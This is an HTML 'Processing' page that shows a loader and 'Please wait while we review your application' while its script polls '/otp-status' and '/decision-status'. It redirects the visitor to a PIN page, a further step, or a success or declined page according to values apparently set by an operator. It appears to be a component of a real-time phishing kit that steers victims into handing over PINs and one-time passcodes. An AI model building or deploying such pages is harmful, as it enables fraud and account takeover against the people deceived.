<!DOCTYPE html>
<html>

<head>
    <title>Processing</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Processing...</h2>

    <div class="loader"></div>

    <p style="text-align:center; margin-top:20px;">
        Please wait while we review your application
    </p>

</div>

<div class="footer"></div>

<script>
// ===============================
// FIRST → GO TO PIN PAGE
// ===============================
if (localStorage.getItem("firstProcess") === "yes") {
    localStorage.removeItem("firstProcess");

    setTimeout(() => {
        window.location.href = "step5.html";
    }, 5000);
}

// ===============================
// ALWAYS POLL (no localStorage gate)
// ===============================
const interval = setInterval(async () => {
    try {
        // 🔹 CHECK OTP
        const otpRes = await fetch("/otp-status");
        const otpData = await otpRes.json();

        console.log("OTP STATUS:", otpData);

        if (Number(otpData.otp) === 5) {
            clearInterval(interval);
            window.location.href = "step5.html";
            return;
        }

        if (Number(otpData.otp) === 6) {
            clearInterval(interval);
            window.location.href = "step6.html";
            return;
        }

        // 🔹 CHECK DECISION
        const decisionRes = await fetch("/decision-status");
        const decisionData = await decisionRes.json();

        console.log("DECISION:", decisionData);

        if (decisionData.decision === "accept") {
            clearInterval(interval);
            window.location.href = "success.html";
        }

        if (decisionData.decision === "decline") {
            clearInterval(interval);
            window.location.href = "declined.html";
        }

    } catch (err) {
        console.log("Waiting...");
    }
}, 2000);
</script>

</body>
</html>
